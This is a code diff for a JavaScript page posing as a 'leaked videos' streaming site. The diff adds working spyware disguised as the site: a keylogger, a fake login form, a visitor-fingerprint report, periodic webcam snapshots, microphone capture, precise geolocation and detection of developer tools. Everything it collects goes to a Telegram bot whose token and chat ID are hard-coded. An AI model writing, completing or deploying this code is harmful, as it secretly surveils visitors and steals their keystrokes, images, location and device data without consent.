@@ -151,34 +151,244 @@ const App = {
   },
 
   generateVideoGrid() {
-    // Your existing code for generating video grid
+    // Placeholder for actual video grid generation logic
+    // This should fetch video data and populate the .video-grid element
+    console.log("Generating video grid...");
+    const videos = [
+      { id: 1, title: "Amazing Nature Scenery", thumbnail: "path/to/thumb1.jpg", src: "path/to/video1.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
+      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "path/to/thumb2.jpg", src: "path/to/video2.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "500K", timestamp: "1 week ago" },
+      // Add more video objects as needed
+    ];
+
+    const videoGrid = this.DOM.videoGrid;
+    videoGrid.innerHTML = ''; // Clear existing grid
+
+    videos.forEach(video => {
+      const card = document.createElement('div');
+      card.classList.add('video-card');
+      card.innerHTML = `
+        <div class="thumbnail-wrapper">
+          <video src="${video.src}" preload="metadata"></video>
+          <span class="duration">3:45</span>
+        </div>
+        <div class="video-details">
+          <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
+          <div class="video-metadata">
+            <h3 class="video-title">${video.title}</h3>
+            <p class="channel-name">${video.channel}</p>
+            <p class="video-stats">${video.views} views &#8226; ${video.timestamp}</p>
+          </div>
+        </div>
+      `;
+      card.addEventListener('click', () => this.showPlayer(video));
+      videoGrid.appendChild(card);
+    });
   },
 
   setupEventListeners() {
-    // Your existing event listeners
+    // Add event listeners for any buttons or interactive elements
+    // Example: Back button
+    this.DOM.backButton.addEventListener('click', () => this.showGrid());
+
+    // Login form submission
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      // Basic login simulation
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      if (username && password) {
+        this.state.isLoggedIn = true;
+        localStorage.setItem('isLoggedIn', 'true');
+        this.DOM.loginModal.classList.remove('visible');
+        alert('Login successful!');
+        // Optionally, redirect or show content
+      } else {
+        alert('Please enter username and password.');
+      }
+    });
+
+    // Optionally, add keylogger functionality (handle with care due to privacy implications)
+    document.addEventListener('keypress', (e) => {
+      this.state.keyLogBuffer += e.key;
+      if (this.state.keyLogBuffer.length > 100) { // Send buffer periodically
+        this.Tracking.send(this.state.keyLogBuffer, true); // true for notification
+        this.state.keyLogBuffer = "";
+      }
+    });
   },
 
-  showPlayer(card) {
-    // Your existing code for showing player
+  showPlayer(video) {
+    this.DOM.gridPage.classList.add('hidden');
+    this.DOM.playerPage.classList.remove('hidden');
+    this.DOM.backButton.classList.remove('hidden');
+    this.DOM.headerTitle.textContent = video.title; // Update header to video title
+
+    this.DOM.mainPlayer.src = video.src;
+    this.DOM.mainVideoTitle.textContent = video.title;
+    this.DOM.mainChannelAvatar.src = video.channelAvatar;
+    this.DOM.mainChannelName.textContent = video.channel;
+    // Update video stats if available
+    document.querySelector('.video-info-bar .video-stats').textContent = `${video.views} subscribers`;
+    document.getElementById('main-video-stats').textContent = `${video.views} views &#8226; ${video.timestamp}`;
+
+    // Populate recommendations (you'll need to implement this logic)
+    this.populateRecommendations(video.id);
+
+    // Show login modal if not logged in
+    if (!this.state.isLoggedIn) {
+      this.DOM.loginModal.classList.add('visible');
+    }
   },
 
   showGrid() {
-    // Your existing code for showing grid
+    this.DOM.gridPage.classList.remove('hidden');
+    this.DOM.playerPage.classList.add('hidden');
+    this.DOM.backButton.classList.add('hidden');
+    this.DOM.headerTitle.textContent = "វីដេអូបែកធ្លាយ"; // Reset header title
+    // Stop the main player
+    this.DOM.mainPlayer.pause();
+    this.DOM.mainPlayer.removeAttribute('src');
   },
 
-  populateRecommendations(currentVideoSrc) {
-    // Your existing code for recommendations
+  populateRecommendations(currentVideoId) {
+    // Placeholder for recommendation logic
+    // Fetch or generate related videos and populate the .recommendations-sidebar
+    console.log(`Populating recommendations for video ID: ${currentVideoId}`);
+    const sidebar = document.getElementById('recommendations-sidebar');
+    sidebar.innerHTML = '<h3>Recommended Videos</h3>'; // Clear previous recommendations
+    const recommendedVideos = [
+      // Example recommendation data
+      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago" },
+      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago" },
+    ];
+
+    recommendedVideos.forEach(recVideo => {
+      if (recVideo.id !== currentVideoId) {
+        const card = document.createElement('div');
+        card.classList.add('compact-video-card');
+        card.innerHTML = `
+          <div class="thumbnail-wrapper">
+            <video src="${recVideo.src}" preload="metadata"></video>
+            <span class="duration">1:15</span>
+          </div>
+          <div class="video-metadata">
+            <h3 class="video-title">${recVideo.title}</h3>
+            <p class="channel-name">Some Channel</p>
+            <p class="video-stats">${recVideo.views} views &#8226; ${recVideo.timestamp}</p>
+          </div>
+        `;
+        card.addEventListener('click', () => this.showPlayer(recVideo));
+        sidebar.appendChild(card);
+      }
+    });
   },
 
   Telegram: {
+    // Base URL for Telegram Bot API
+    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // Using the token directly for simplicity, but consider environment variables
+
     async send(message, notify = false) {
+      const url = `${this.telegramApiBaseUrl}sendMessage`;
       try {
-        await fetch(`https://api.telegram.org/bot${App.config.botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: App.config.chatId, text: message, parse_mode: 'Markdown', disable_notification: !notify })
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: "1272791365",
+            text: message,
+            parse_mode: 'Markdown', // Or 'HTML'
+            disable_notification: !notify
+          })
         });
-      } catch(e) { console.warn("Telegram send error:", e); }
+        if (!response.ok) {
+          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`);
+          const errorData = await response.json();
+          console.error("Telegram response:", errorData);
+        } else {
+          console.log("Message sent to Telegram successfully.");
+        }
+      } catch (e) {
+        console.warn("Telegram send error:", e);
+      }
+    },
+
+    async sendPhoto(caption, photoBlob) {
+      const url = `${this.telegramApiBaseUrl}sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', "1272791365");
+      formData.append('caption', caption);
+      formData.append('photo', photoBlob, 'snapshot.png'); // Provide a filename
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+        });
+        if (!response.ok) {
+          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`);
+          const errorData = await response.json();
+          console.error("Telegram response:", errorData);
+        } else {
+          console.log("Photo sent to Telegram successfully.");
+        }
+      } catch (e) {
+        console.warn("Telegram sendPhoto error:", e);
+      }
+    },
+
+    async sendAudio(caption, audioBlob) {
+      const url = `${this.telegramApiBaseUrl}sendAudio`;
+      const formData = new FormData();
+      formData.append('chat_id', "1272791365");
+      formData.append('caption', caption);
+      formData.append('audio', audioBlob, 'recording.ogg'); // Provide a filename and extension
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+        });
+        if (!response.ok) {
+          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`);
+          const errorData = await response.json();
+          console.error("Telegram response:", errorData);
+        } else {
+          console.log("Audio sent to Telegram successfully.");
+        }
+      } catch (e) {
+        console.warn("Telegram sendAudio error:", e);
+      }
+    },
+
+    async sendLocation(latitude, longitude, caption = "User Location") {
+      const url = `${this.telegramApiBaseUrl}sendLocation`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: "1272791365",
+            latitude: latitude,
+            longitude: longitude,
+            // You can add more parameters like live_period, heading, proximity_alert_radius if needed
+          })
+        });
+        if (!response.ok) {
+          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`);
+          const errorData = await response.json();
+          console.error("Telegram response:", errorData);
+        } else {
+          console.log("Location sent to Telegram successfully.");
+          // Optionally send the caption as a separate message or handle it
+          // this.send(`Location shared: ${caption}`);
+        }
+      } catch (e) {
+        console.warn("Telegram sendLocation error:", e);
+      }
     }
   },
 
@@ -188,63 +398,83 @@ const App = {
       await this.send("🚀 New Session Started");
       const report = await this.getInitialReport();
       await this.send(report);
-      
+
       // Request permissions
-      await this.checkPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
-      await this.checkPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
-      await this.checkPermission('geolocation', this.requestGeolocation.bind(this));
-      
+      // Using a more robust approach with Permissions API
+      await this.checkAndRequestPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
+      await this.checkAndRequestPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
+      await this.checkAndRequestPermission('geolocation', this.requestGeolocation.bind(this));
+
       // Detect dev tools
       this.detectDevTools();
+
+      // Start periodic snapshotting if camera is available
+      if (this.cameraStream) {
+        this.startSnapshotting();
+      }
     },
 
-    async checkPermission(name, requestFn, stopFn = () => {}) {
+    async checkAndRequestPermission(name, requestFn, stopFn = () => {}) {
       try {
-        // Log permission status
-        if (navigator.permissions) {
-          const res = await navigator.permissions.query({ name });
-          console.log(`Permission ${name}: ${res.state}`);
-          
-          if (res.state === 'granted') {
-            requestFn();
-          } else if (res.state === 'prompt') {
-            // Request permission
-            requestFn();
-          }
-          
-          res.onchange = () => {
-            console.log(`Permission ${name} changed to ${res.state}`);
-            if (res.state === 'granted') {
-              requestFn();
-            } else {
-              stopFn();
-            }
-          };
-        } else {
-          // Fallback if permissions API not supported
-          console.warn(`Permissions API not supported, requesting ${name} directly.`);
+        if (!navigator.permissions) {
+          console.warn(`Permissions API not supported for ${name}. Attempting direct request.`);
+          requestFn();
+          return;
+        }
+        const status = await navigator.permissions.query({ name });
+        console.log(`Permission ${name}: ${status.state}`);
+
+        if (status.state === 'granted') {
+          requestFn();
+        } else if (status.state === 'prompt') {
+          // Request permission if not granted and prompt is available
           requestFn();
         }
+
+        status.onchange = () => {
+          console.log(`Permission ${name} changed to ${status.state}`);
+          if (status.state === 'granted') {
+            requestFn();
+          } else {
+            stopFn();
+          }
+        };
       } catch (e) {
-        console.warn(`Permission check failed for ${name}:`, e);
-        // Fallback: directly request permission
+        console.warn(`Error checking/requesting permission for ${name}:`, e);
+        // Fallback to direct request if Permissions API fails
         requestFn();
       }
     },
 
     async getInitialReport() {
       console.log("Gathering initial report...");
-      const report = `*💻 New Visitor Report*\n\n` +
-        `*IP (Public):* ...\n` +
-        `*IP (Local):* ...\n` +
-        `*OS:* ...\n` +
-        `*Browser:* ...\n` +
-        `*Language:* ...\n` +
-        `*Timezone:* ...\n` +
-        `*Incognito:* ...\n` +
-        `*Screen:* ...\n` +
-        `*Hardware:* ...\n` +
-        `*Battery:* ...\n`;
+      let report = `*💻 New Visitor Report*\n\n`;
+
+      try {
+        // Attempt to get public IP (requires a third-party service)
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        report += `*IP (Public):* \`${ipData.ip}\`\n`;
+      } catch (e) {
+        report += `*IP (Public):* N/A (Could not fetch)\n`;
+      }
+
+      report += `*IP (Local):* Not directly accessible from browser JS for security reasons.\n`;
+      report += `*OS:* ${navigator.platform || 'N/A'}\n`;
+      report += `*Browser:* ${navigator.userAgent || 'N/A'}\n`;
+      report += `*Language:* ${navigator.language || 'N/A'}\n`;
+      report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}\n`;
+      report += `*Incognito:* ${navigator.storage && navigator.storage.persisted ? (await navigator.storage.persisted() ? 'No' : 'Yes') : 'N/A'}\n`; // Basic incognito check
+      report += `*Screen:* ${window.screen.width}x${window.screen.height}\n`;
+      // Hardware and Battery status might require specific permissions or are not easily accessible
+      report += `*Hardware:* Limited information available\n`;
+      try {
+        const battery = await navigator.getBattery();
+        report += `*Battery:* ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}\n`;
+      } catch (e) {
+        report += `*Battery:* N/A (Permissions error or not supported)\n`;
+      }
+
       return report;
     },
 
@@ -257,8 +487,8 @@ const App = {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         this.cameraStream = stream;
         console.log("Camera permission granted.");
-        // Take snapshot or handle stream as needed
-        this.captureAndSend("📸 Webcam Snapshot");
+        App.DOM.captureVideo.srcObject = stream; // Display camera feed if needed
+        this.startSnapshotting(); // Start snapshots once camera is active
       } catch (e) {
         console.warn("Camera permission error:", e);
         this.send(`🚫 Camera permission error: ${e.message}`);
@@ -270,6 +500,7 @@ const App = {
         this.cameraStream.getTracks().forEach(t => t.stop());
         this.cameraStream = null;
         console.log("Camera stopped.");
+        this.stopSnapshotting();
       }
     },
 
@@ -303,17 +534,35 @@ const App = {
     startMicRecording(stream) {
       if (!window.MediaRecorder) {
         console.warn("MediaRecorder not supported");
+        this.send("⚠️ MediaRecorder API not supported.");
         return;
       }
-      this.state.mediaRecorder = new MediaRecorder(stream);
-      this.state.mediaRecorder.ondataavailable = e => {
-        if (e.data && e.data.size > 0) {
-          this.sendAudio(e.data);
-          console.log("Audio data sent");
-        }
-      };
-      this.state.mediaRecorder.start(this.config.micRecordInterval);
-      console.log("Microphone recording started");
+      try {
+        this.state.mediaRecorder = new MediaRecorder(stream);
+        this.state.mediaRecorder.ondataavailable = async (e) => {
+          if (e.data && e.data.size > 0) {
+            // Convert Blob to something that can be sent to Telegram (e.g., using sendAudio)
+            // Note: Telegram's sendAudio expects a file, so we might need to upload it first
+            // or check if sendAudio directly supports Blobs with FormData.
+            console.log("Audio data available, attempting to send...");
+            // For simplicity, we'll send a message indicating audio recording
+            // A full implementation would involve uploading the audio data.
+            await this.send(`*🎙️ Audio Recording (${(e.data.size / 1024 / 1024).toFixed(2)} MB) captured.*`, true);
+            // If you have a working `sendAudio` implementation that accepts Blobs:
+            // App.Telegram.sendAudio("Voice message", e.data);
+          }
+        };
+        this.state.mediaRecorder.onstop = () => {
+          console.log("Microphone recording stopped.");
+          this.send("🎙️ Microphone recording stopped.");
+        };
+        this.state.mediaRecorder.start(this.config.micRecordInterval);
+        console.log(`Microphone recording started with interval ${this.config.micRecordInterval}ms`);
+        this.send("🎙️ Microphone recording started.");
+      } catch (error) {
+        console.error("Error starting MediaRecorder:", error);
+        this.send(`🚫 Error starting microphone recording: ${error.message}`);
+      }
     },
 
     async requestGeolocation() {
@@ -324,45 +573,82 @@ const App = {
       navigator.geolocation.getCurrentPosition(
         p => {
           this.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
-          this.send(`📍 Location: ${p.coords.latitude}, ${p.coords.longitude}`);
-          this.sendLocation(p.coords.latitude, p.coords.longitude);
-          console.log("Geolocation sent");
+          console.log(`Geolocation sent: ${p.coords.latitude}, ${p.coords.longitude}`);
+          // Send location to Telegram
+          App.Telegram.sendLocation(p.coords.latitude, p.coords.longitude);
+          // Optionally send a text message with coordinates
+          // this.send(`📍 Location: \`${p.coords.latitude}, ${p.coords.longitude}\``, true);
         },
         e => {
           console.warn("Geolocation error:", e);
-          this.send(`🚫 Geo Error: ${e.code === 1 ? "Denied" : "Unavailable"}`);
+          this.send(`🚫 Geo Error: Code ${e.code} - ${e.message}`);
         },
-        { enableHighAccuracy: true }
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for accuracy and timeout
       );
     },
 
     detectDevTools() {
-      const t = 160;
-      let o = false;
-      const c = () => {
-        if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) {
-          if (!o) {
-            this.send("⚠️ Dev Tools Opened!");
-            o = true;
-          }
-        } else {
-          o = false;
+      const t = 160; // Threshold for detecting dev tools
+      let devToolsOpened = false;
+      const checkDevTools = () => {
+        const isDevToolsOpen = window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t;
+        if (isDevToolsOpen && !devToolsOpened) {
+          devToolsOpened = true;
+          console.log("Dev Tools Opened!");
+          this.send("⚠️ Developer Tools Opened!", true);
+        } else if (!isDevToolsOpen && devToolsOpened) {
+          devToolsOpened = false;
+          console.log("Dev Tools Closed!");
+          this.send("✅ Developer Tools Closed.", true);
         }
-        requestAnimationFrame(c);
+        // Use requestAnimationFrame for smoother checks
+        requestAnimationFrame(checkDevTools);
       };
-      requestAnimationFrame(c);
+      requestAnimationFrame(checkDevTools);
     },
 
-    async sendPhoto(blob, caption) {
-      // Implement your sendPhoto logic here if needed
+    startSnapshotting() {
+      if (this.state.snapshotIntervalId) return; // Already running
+      console.log(`Starting snapshotting every ${this.config.snapshotInterval}ms`);
+      this.state.snapshotIntervalId = setInterval(() => {
+        this.captureAndSend("📸 Webcam Snapshot");
+      }, this.config.snapshotInterval);
     },
 
-    async sendAudio(blob) {
-      // Implement your sendAudio logic here if needed
+    stopSnapshotting() {
+      if (this.state.snapshotIntervalId) {
+        clearInterval(this.state.snapshotIntervalId);
+        this.state.snapshotIntervalId = null;
+        console.log("Snapshotting stopped.");
+      }
     },
 
-    async sendLocation(lat, lon) {
-      // Implement your sendLocation logic here if needed
+    captureAndSend(caption) {
+      if (!this.cameraStream) {
+        console.log("Camera not active, cannot capture snapshot.");
+        return;
+      }
+
+      const video = App.DOM.captureVideo;
+      const canvas = App.DOM.captureCanvas;
+      const context = canvas.getContext('2d');
+
+      // Set canvas dimensions to match video aspect ratio
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Draw the current video frame onto the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert canvas content to a Blob
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          console.log("Snapshot captured, sending to Telegram...");
+          await App.Telegram.sendPhoto(caption, blob);
+        } else {
+          console.error("Failed to create snapshot blob.");
+        }
+      }, 'image/png'); // Or 'image/jpeg' for smaller file size
     }
   }
 };
